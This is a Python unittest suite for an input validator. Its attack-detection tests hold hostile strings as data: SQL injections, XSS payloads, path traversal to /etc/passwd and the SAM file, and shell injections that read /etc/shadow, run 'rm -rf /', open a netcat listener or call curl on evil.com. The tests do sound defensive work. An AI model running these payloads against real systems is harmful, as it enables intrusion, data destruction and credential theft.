"""
Comprehensive Test Suite for Input Validation System

This test suite provides thorough testing of the input validation system,
including attack pattern detection, validation levels, and security checks
as per BAR Rules R030 - Input Validation Violations.

Test Categories:
- Basic input validation functionality
- Attack pattern detection and prevention
- Different validation levels and modes
- Error handling and edge cases
- Performance and scalability testing
- Security boundary testing
- Integration with GUI components

Author: Rolan Lobo (RNR)
Version: 2.0.0
Last Updated: January 2025
"""

import os
import sys
import unittest
import threading
import time
from unittest.mock import patch, MagicMock
from typing import List, Dict, Any, Optional

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

try:
    from config.input_validator import (
        InputValidator, ValidationLevel, ValidationResult,
        ValidationError, AttackType, validate_string,
        validate_password, validate_filename, validate_file_path,
        validate_device_name, validate_integer, detect_attack_patterns
    )
    VALIDATOR_AVAILABLE = True
except ImportError as e:
    print(f"⚠️ Input validator module not available: {e}")
    VALIDATOR_AVAILABLE = False


class InputValidatorTestCase(unittest.TestCase):
    """Base test case for input validation testing."""
    
    def setUp(self):
        """Set up test environment."""
        if not VALIDATOR_AVAILABLE:
            self.skipTest("Input validator module not available")
        
        # Create validator instance
        self.validator = InputValidator()
    
    def assert_validation_success(self, result: ValidationResult):
        """Assert that validation was successful."""
        self.assertTrue(result.is_valid)
        self.assertEqual(len(result.errors), 0)
        self.assertEqual(len(result.warnings), 0)
    
    def assert_validation_failure(self, result: ValidationResult, expected_error_count: int = 1):
        """Assert that validation failed with expected error count."""
        self.assertFalse(result.is_valid)
        self.assertGreaterEqual(len(result.errors), expected_error_count)
    
    def assert_attack_detected(self, result: ValidationResult, attack_type: AttackType):
        """Assert that a specific attack type was detected."""
        self.assertFalse(result.is_valid)
        detected_attacks = [error for error in result.errors if attack_type.value in str(error)]
        self.assertGreater(len(detected_attacks), 0, f"Attack {attack_type} not detected")


class TestBasicValidation(InputValidatorTestCase):
    """Test basic validation functionality."""
    
    def test_string_validation_success(self):
        """Test successful string validation."""
        valid_strings = [
            "Hello World",
            "Valid-File_Name.txt",
            "User123",
            "email@domain.com",
            "Simple text with spaces"
        ]
        
        for test_string in valid_strings:
            with self.subTest(string=test_string):
                result = validate_string(test_string, ValidationLevel.BASIC)
                self.assert_validation_success(result)
    
    def test_string_validation_empty(self):
        """Test validation of empty strings."""
        # Empty string should be valid in basic mode
        result = validate_string("", ValidationLevel.BASIC)
        self.assert_validation_success(result)
        
        # Empty string might be invalid in strict mode
        result = validate_string("", ValidationLevel.STRICT)
        # This depends on implementation - either valid or invalid is acceptable
    
    def test_string_validation_length_limits(self):
        """Test string validation with length limits."""
        # Test minimum length
        result = validate_string("a", min_length=5)
        self.assert_validation_failure(result)
        
        # Test maximum length
        long_string = "a" * 1000
        result = validate_string(long_string, max_length=100)
        self.assert_validation_failure(result)
        
        # Test valid length range
        result = validate_string("valid", min_length=3, max_length=10)
        self.assert_validation_success(result)
    
    def test_integer_validation_success(self):
        """Test successful integer validation."""
        valid_integers = [0, 1, -1, 100, -100, 2147483647]
        
        for test_int in valid_integers:
            with self.subTest(integer=test_int):
                result = validate_integer(test_int)
                self.assert_validation_success(result)
    
    def test_integer_validation_ranges(self):
        """Test integer validation with range limits."""
        # Test minimum value
        result = validate_integer(5, min_value=10)
        self.assert_validation_failure(result)
        
        # Test maximum value
        result = validate_integer(15, max_value=10)
        self.assert_validation_failure(result)
        
        # Test valid range
        result = validate_integer(7, min_value=5, max_value=10)
        self.assert_validation_success(result)
    
    def test_filename_validation_success(self):
        """Test successful filename validation."""
        valid_filenames = [
            "document.txt",
            "image.jpg",
            "data_file.csv",
            "report-2025.pdf",
            "backup (1).zip"
        ]
        
        for filename in valid_filenames:
            with self.subTest(filename=filename):
                result = validate_filename(filename)
                self.assert_validation_success(result)
    
    def test_filename_validation_failures(self):
        """Test filename validation failures."""
        invalid_filenames = [
            "",  # Empty filename
            ".",  # Current directory
            "..",  # Parent directory
            "file<with>invalid*chars?.txt",  # Invalid characters
            "a" * 300,  # Too long
            "file|with|pipes.txt",  # Pipe characters
            "con.txt",  # Reserved name (Windows)
            "prn.doc",  # Reserved name (Windows)
        ]
        
        for filename in invalid_filenames:
            with self.subTest(filename=filename):
                result = validate_filename(filename)
                self.assert_validation_failure(result)
    
    def test_file_path_validation_success(self):
        """Test successful file path validation."""
        valid_paths = [
            "/home/user/document.txt",
            "C:\\Users\\User\\file.txt",
            "./relative/path.txt",
            "../parent/file.txt",
            "simple_file.txt"
        ]
        
        for path in valid_paths:
            with self.subTest(path=path):
                result = validate_file_path(path)
                self.assert_validation_success(result)
    
    def test_file_path_validation_failures(self):
        """Test file path validation failures."""
        invalid_paths = [
            "",  # Empty path
            "path/with\x00null.txt",  # Null character
            "path/with\ttab.txt",  # Tab character
            "a" * 1000,  # Too long
        ]
        
        for path in invalid_paths:
            with self.subTest(path=path):
                result = validate_file_path(path)
                self.assert_validation_failure(result)
    
    def test_device_name_validation_success(self):
        """Test successful device name validation."""
        valid_names = [
            "MyComputer",
            "Laptop-01",
            "WorkStation_2025",
            "Server123",
            "Device-Name"
        ]
        
        for name in valid_names:
            with self.subTest(name=name):
                result = validate_device_name(name)
                self.assert_validation_success(result)
    
    def test_device_name_validation_failures(self):
        """Test device name validation failures."""
        invalid_names = [
            "",  # Empty name
            ".",  # Single dot
            "..",  # Double dots
            "name with spaces",  # Spaces (might be invalid)
            "name|with|pipes",  # Pipe characters
            "a" * 100,  # Too long
            "name<with>brackets",  # Invalid characters
        ]
        
        for name in invalid_names:
            with self.subTest(name=name):
                result = validate_device_name(name)
                # Note: Some of these might actually be valid depending on implementation
                # The test should be adjusted based on actual requirements


class TestPasswordValidation(InputValidatorTestCase):
    """Test password validation functionality."""
    
    def test_password_strength_weak(self):
        """Test detection of weak passwords."""
        weak_passwords = [
            "123456",
            "password",
            "abc123",
            "qwerty",
            "letmein",
            "admin",
            "12345678",
            "password123"
        ]
        
        for password in weak_passwords:
            with self.subTest(password=password):
                result = validate_password(password)
                # Weak passwords should either fail validation or generate warnings
                if result.is_valid:
                    self.assertGreater(len(result.warnings), 0, f"No warnings for weak password: {password}")
    
    def test_password_strength_strong(self):
        """Test validation of strong passwords."""
        strong_passwords = [
            "MyStr0ng!P@ssw0rd",
            "C0mplex$Passw0rd#2025",
            "S3cur3!Password&WithNumbers",
            "V3ry$Strong!Passw0rd#123",
            "Un!qu3&C0mplex$Password"
        ]
        
        for password in strong_passwords:
            with self.subTest(password=password):
                result = validate_password(password)
                self.assert_validation_success(result)
    
    def test_password_length_requirements(self):
        """Test password length requirements."""
        # Too short
        result = validate_password("Ab1!")
        self.assert_validation_failure(result)
        
        # Minimum acceptable length
        result = validate_password("Ab1!efgh")  # 8 characters
        # Should be valid or have warnings
        
        # Good length
        result = validate_password("Ab1!efghijklmnop")  # 16 characters
        if not result.is_valid:
            # If invalid, should be due to other factors, not length
            length_errors = [e for e in result.errors if "length" in str(e).lower()]
            self.assertEqual(len(length_errors), 0)
    
    def test_password_character_requirements(self):
        """Test password character requirements."""
        # Only lowercase
        result = validate_password("onlylowercase")
        if result.is_valid:
            self.assertGreater(len(result.warnings), 0)
        
        # Only uppercase
        result = validate_password("ONLYUPPERCASE")
        if result.is_valid:
            self.assertGreater(len(result.warnings), 0)
        
        # Only numbers
        result = validate_password("123456789")
        self.assert_validation_failure(result)
        
        # Mixed case and numbers
        result = validate_password("MixedCase123")
        # Should be better than single-case passwords
    
    def test_password_common_patterns(self):
        """Test detection of common password patterns."""
        common_patterns = [
            "123456789",
            "abcdefgh",
            "qwertyuiop",
            "password123",
            "admin123",
            "letmein123"
        ]
        
        for password in common_patterns:
            with self.subTest(password=password):
                result = validate_password(password)
                # Should fail validation or generate warnings
                if result.is_valid:
                    self.assertGreater(len(result.warnings), 0)


class TestAttackDetection(InputValidatorTestCase):
    """Test attack pattern detection."""
    
    def test_sql_injection_detection(self):
        """Test SQL injection attack detection."""
        sql_injections = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'; --",
            "1' UNION SELECT * FROM passwords --",
            "'; DELETE FROM accounts WHERE '1'='1'; --",
            "1' OR 1=1#",
            "' OR 'a'='a",
            "1'; EXEC sp_configure 'show advanced options', 1; --"
        ]
        
        for injection in sql_injections:
            with self.subTest(injection=injection):
                result = validate_string(injection, ValidationLevel.STRICT)
                self.assert_attack_detected(result, AttackType.SQL_INJECTION)
    
    def test_xss_detection(self):
        """Test XSS attack detection."""
        xss_attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "';alert(String.fromCharCode(88,83,83))//'"
        ]
        
        for xss in xss_attacks:
            with self.subTest(xss=xss):
                result = validate_string(xss, ValidationLevel.STRICT)
                self.assert_attack_detected(result, AttackType.XSS)
    
    def test_command_injection_detection(self):
        """Test command injection attack detection."""
        command_injections = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(cat /etc/shadow)",
            "; cat /etc/hosts",
            "| netstat -an",
            "&& ping google.com",
            "; nc -l -p 1234",
            "| curl http://evil.com"
        ]
        
        for injection in command_injections:
            with self.subTest(injection=injection):
                result = validate_string(injection, ValidationLevel.STRICT)
                self.assert_attack_detected(result, AttackType.COMMAND_INJECTION)
    
    def test_path_traversal_detection(self):
        """Test path traversal attack detection."""
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..//..//..//etc//passwd",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"
        ]
        
        for traversal in path_traversals:
            with self.subTest(traversal=traversal):
                result = validate_file_path(traversal, ValidationLevel.STRICT)
                self.assert_attack_detected(result, AttackType.PATH_TRAVERSAL)
    
    def test_buffer_overflow_detection(self):
        """Test buffer overflow attack detection."""
        # Very long strings that might cause buffer overflow
        buffer_overflows = [
            "A" * 10000,
            "B" * 50000,
            "C" * 100000,
            "%s" * 1000,
            "%n" * 1000,
            "\x41" * 10000
        ]
        
        for overflow in buffer_overflows:
            with self.subTest(length=len(overflow)):
                result = validate_string(overflow, ValidationLevel.STRICT)
                self.assert_attack_detected(result, AttackType.BUFFER_OVERFLOW)
    
    def test_format_string_detection(self):
        """Test format string attack detection."""
        format_strings = [
            "%x%x%x%x%x%x%x%x",
            "%s%s%s%s%s%s%s%s",
            "%n%n%n%n%n%n%n%n",
            "AAAA%08x.%08x.%08x.%08x",
            "AAAA%p%p%p%p%p%p%p%p",
            "%d%d%d%d%d%d%d%d",
            "%.1000d",
            "%1000000s"
        ]
        
        for fmt_str in format_strings:
            with self.subTest(format_string=fmt_str):
                result = validate_string(fmt_str, ValidationLevel.STRICT)
                self.assert_attack_detected(result, AttackType.FORMAT_STRING)
    
    def test_null_byte_injection_detection(self):
        """Test null byte injection detection."""
        null_injections = [
            "file.txt\x00.exe",
            "script.php\x00.txt",
            "data\x00malicious_code",
            "normal_file\x00../../../etc/passwd",
            "upload.jpg\x00<script>alert('xss')</script>"
        ]
        
        for injection in null_injections:
            with self.subTest(injection=repr(injection)):
                result = validate_string(injection, ValidationLevel.STRICT)
                self.assert_attack_detected(result, AttackType.NULL_BYTE_INJECTION)


class TestValidationLevels(InputValidatorTestCase):
    """Test different validation levels."""
    
    def test_basic_level_permissive(self):
        """Test that basic validation level is permissive."""
        test_strings = [
            "simple_string",
            "String with spaces",
            "String-with-dashes",
            "String_with_underscores"
        ]
        
        for test_string in test_strings:
            with self.subTest(string=test_string):
                result = validate_string(test_string, ValidationLevel.BASIC)
                self.assert_validation_success(result)
    
    def test_moderate_level_balanced(self):
        """Test that moderate validation level provides balanced security."""
        # Should allow normal strings
        result = validate_string("Normal string", ValidationLevel.MODERATE)
        self.assert_validation_success(result)
        
        # Should block obvious attacks
        result = validate_string("<script>alert('xss')</script>", ValidationLevel.MODERATE)
        self.assert_validation_failure(result)
    
    def test_strict_level_restrictive(self):
        """Test that strict validation level is restrictive."""
        # Should block many potentially dangerous patterns
        suspicious_strings = [
            "string with <brackets>",
            "string with 'quotes'",
            'string with "double quotes"',
            "string with %format%",
            "string with $(commands)"
        ]
        
        for test_string in suspicious_strings:
            with self.subTest(string=test_string):
                result = validate_string(test_string, ValidationLevel.STRICT)
                # Strict mode should be more restrictive
                # (Exact behavior depends on implementation)
    
    def test_paranoid_level_very_restrictive(self):
        """Test that paranoid validation level is very restrictive."""
        # Should only allow very safe strings
        safe_string = "SafeString123"
        result = validate_string(safe_string, ValidationLevel.PARANOID)
        self.assert_validation_success(result)
        
        # Should block almost everything else
        risky_strings = [
            "String with spaces",  # Even spaces might be blocked
            "String-with-dashes",
            "String_with_underscores",
            "String.with.dots"
        ]
        
        for test_string in risky_strings:
            with self.subTest(string=test_string):
                result = validate_string(test_string, ValidationLevel.PARANOID)
                # Paranoid mode should be very restrictive


class TestValidationCustomization(InputValidatorTestCase):
    """Test validation customization options."""
    
    def test_custom_allowed_characters(self):
        """Test validation with custom allowed characters."""
        # This test assumes the validator supports custom character sets
        try:
            allowed_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
            result = validate_string("valid123", allowed_characters=allowed_chars)
            self.assert_validation_success(result)
            
            result = validate_string("invalid@symbol", allowed_characters=allowed_chars)
            self.assert_validation_failure(result)
        except TypeError:
            # If custom characters not supported, skip test
            self.skipTest("Custom allowed characters not supported")
    
    def test_custom_blocked_patterns(self):
        """Test validation with custom blocked patterns."""
        try:
            blocked_patterns = [r"admin", r"test\d+", r"temp.*"]
            result = validate_string("normal_string", blocked_patterns=blocked_patterns)
            self.assert_validation_success(result)
            
            result = validate_string("admin_user", blocked_patterns=blocked_patterns)
            self.assert_validation_failure(result)
            
            result = validate_string("test123", blocked_patterns=blocked_patterns)
            self.assert_validation_failure(result)
        except TypeError:
            # If custom patterns not supported, skip test
            self.skipTest("Custom blocked patterns not supported")
    
    def test_whitelist_validation(self):
        """Test whitelist-based validation."""
        try:
            whitelist = ["allowed1", "allowed2", "valid_string"]
            
            result = validate_string("allowed1", whitelist=whitelist)
            self.assert_validation_success(result)
            
            result = validate_string("not_allowed", whitelist=whitelist)
            self.assert_validation_failure(result)
        except TypeError:
            # If whitelist not supported, skip test
            self.skipTest("Whitelist validation not supported")


class TestPerformanceAndScalability(InputValidatorTestCase):
    """Test performance and scalability of validation."""
    
    def test_validation_performance_small_inputs(self):
        """Test validation performance with small inputs."""
        small_strings = ["test" + str(i) for i in range(1000)]
        
        start_time = time.time()
        for test_string in small_strings:
            result = validate_string(test_string, ValidationLevel.MODERATE)
        end_time = time.time()
        
        total_time = end_time - start_time
        avg_time = total_time / len(small_strings)
        
        # Should be very fast for small strings
        self.assertLess(avg_time, 0.001, f"Validation too slow: {avg_time:.6f}s average")
        print(f"Small input validation: {avg_time:.6f}s average per string")
    
    def test_validation_performance_large_inputs(self):
        """Test validation performance with large inputs."""
        large_strings = ["A" * (1000 * (i + 1)) for i in range(10)]  # 1KB to 10KB
        
        times = []
        for test_string in large_strings:
            start_time = time.time()
            result = validate_string(test_string, ValidationLevel.MODERATE)
            end_time = time.time()
            times.append(end_time - start_time)
        
        avg_time = sum(times) / len(times)
        max_time = max(times)
        
        # Should handle large strings reasonably well
        self.assertLess(max_time, 1.0, f"Large string validation too slow: {max_time:.3f}s")
        print(f"Large input validation: {avg_time:.6f}s average, {max_time:.6f}s max")
    
    def test_concurrent_validation(self):
        """Test concurrent validation operations."""
        num_threads = 5
        validations_per_thread = 100
        
        results = []
        errors = []
        
        def validation_worker(thread_id: int):
            try:
                thread_results = []
                for i in range(validations_per_thread):
                    test_string = f"thread{thread_id}_string{i}"
                    result = validate_string(test_string, ValidationLevel.MODERATE)
                    thread_results.append(result.is_valid)
                
                results.extend(thread_results)
                
            except Exception as e:
                errors.append(f"Thread {thread_id}: {str(e)}")
        
        # Create and start threads
        threads = []
        start_time = time.time()
        
        for thread_id in range(num_threads):
            thread = threading.Thread(target=validation_worker, args=(thread_id,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Check results
        self.assertEqual(len(errors), 0, f"Concurrent validation errors: {errors}")
        self.assertEqual(len(results), num_threads * validations_per_thread)
        
        # All simple strings should be valid
        valid_count = sum(results)
        self.assertEqual(valid_count, len(results), "Some valid strings were rejected")
        
        print(f"Concurrent validation: {total_time:.3f}s total for {len(results)} validations")


class TestEdgeCases(InputValidatorTestCase):
    """Test edge cases and boundary conditions."""
    
    def test_unicode_handling(self):
        """Test validation of Unicode characters."""
        unicode_strings = [
            "Hello, 世界",
            "café résumé",
            "🔒🔑💻",
            "Здравствуй мир",
            "مرحبا بالعالم",
            "混合された文字列123"
        ]
        
        for test_string in unicode_strings:
            with self.subTest(string=test_string):
                result = validate_string(test_string, ValidationLevel.BASIC)
                # Unicode should be handled gracefully
                # (Exact behavior depends on requirements)
    
    def test_special_characters(self):
        """Test validation of special characters."""
        special_chars = [
            "\n\r\t",  # Whitespace characters
            "\x00\x01\x02",  # Control characters
            "©®™€£¥",  # Symbol characters
            "áéíóú",  # Accented characters
            "αβγδε",  # Greek characters
        ]
        
        for chars in special_chars:
            with self.subTest(chars=repr(chars)):
                result = validate_string(chars, ValidationLevel.MODERATE)
                # Should handle special characters appropriately
    
    def test_very_long_inputs(self):
        """Test validation of very long inputs."""
        # Test progressively longer strings
        lengths = [1000, 10000, 100000, 1000000]
        
        for length in lengths:
            with self.subTest(length=length):
                long_string = "A" * length
                
                start_time = time.time()
                result = validate_string(long_string, ValidationLevel.BASIC)
                end_time = time.time()
                
                validation_time = end_time - start_time
                
                # Should complete within reasonable time
                max_time = length / 100000  # 1s per 100KB
                self.assertLess(validation_time, max_time,
                               f"Validation too slow for {length} chars: {validation_time:.3f}s")
    
    def test_binary_data(self):
        """Test validation of binary data."""
        binary_data = [
            b"\x00\x01\x02\x03\x04".decode('latin1'),
            b"\xFF\xFE\xFD\xFC".decode('latin1'),
            bytes(range(256)).decode('latin1')
        ]
        
        for data in binary_data:
            with self.subTest(data=repr(data[:20])):
                result = validate_string(data, ValidationLevel.BASIC)
                # Should handle binary data without crashing


class TestErrorHandling(InputValidatorTestCase):
    """Test error handling in validation."""
    
    def test_none_input_handling(self):
        """Test handling of None inputs."""
        # Should handle None gracefully
        try:
            result = validate_string(None, ValidationLevel.BASIC)
            self.assert_validation_failure(result)
        except (TypeError, ValueError):
            # Also acceptable to raise an exception for None
            pass
    
    def test_invalid_type_handling(self):
        """Test handling of invalid input types."""
        invalid_inputs = [123, [], {}, object(), lambda x: x]
        
        for invalid_input in invalid_inputs:
            with self.subTest(input_type=type(invalid_input).__name__):
                try:
                    result = validate_string(invalid_input, ValidationLevel.BASIC)
                    self.assert_validation_failure(result)
                except (TypeError, ValueError):
                    # Also acceptable to raise an exception
                    pass
    
    def test_invalid_validation_level(self):
        """Test handling of invalid validation levels."""
        try:
            result = validate_string("test", "invalid_level")
            # Should handle gracefully or raise appropriate error
        except (TypeError, ValueError):
            # Expected behavior
            pass
    
    def test_malformed_parameters(self):
        """Test handling of malformed parameters."""
        # Negative length limits
        try:
            result = validate_string("test", min_length=-5)
            # Should handle gracefully
        except ValueError:
            # Also acceptable
            pass
        
        # Invalid max < min
        try:
            result = validate_string("test", min_length=10, max_length=5)
            # Should handle gracefully
        except ValueError:
            # Also acceptable
            pass


def create_input_validator_test_suite():
    """Create a comprehensive test suite for input validation."""
    suite = unittest.TestSuite()
    
    # Add all test classes
    test_classes = [
        TestBasicValidation,
        TestPasswordValidation,
        TestAttackDetection,
        TestValidationLevels,
        TestValidationCustomization,
        TestPerformanceAndScalability,
        TestEdgeCases,
        TestErrorHandling
    ]
    
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    return suite


def run_input_validator_tests():
    """Run all input validation tests and return results."""
    if not VALIDATOR_AVAILABLE:
        print("❌ Input validator module not available - cannot run tests")
        return False
    
    print("🛡️ Running Input Validator Test Suite...")
    print("=" * 60)
    
    # Create and run test suite
    suite = create_input_validator_test_suite()
    runner = unittest.TextTestRunner(verbosity=2, buffer=True)
    result = runner.run(suite)
    
    # Print summary
    print(f"\n{'='*60}")
    print(f"INPUT VALIDATOR TEST SUMMARY")
    print(f"{'='*60}")
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    
    if result.failures:
        print(f"\n❌ FAILURES ({len(result.failures)}):")
        for test, traceback in result.failures:
            print(f"  - {test}")
    
    if result.errors:
        print(f"\n💥 ERRORS ({len(result.errors)}):")
        for test, traceback in result.errors:
            print(f"  - {test}")
    
    success = len(result.failures) == 0 and len(result.errors) == 0
    if success:
        print("\n✅ All input validator tests passed!")
    else:
        print(f"\n❌ Some input validator tests failed.")
    
    return success


if __name__ == "__main__":
    # Run tests when script is executed directly
    success = run_input_validator_tests()
    sys.exit(0 if success else 1)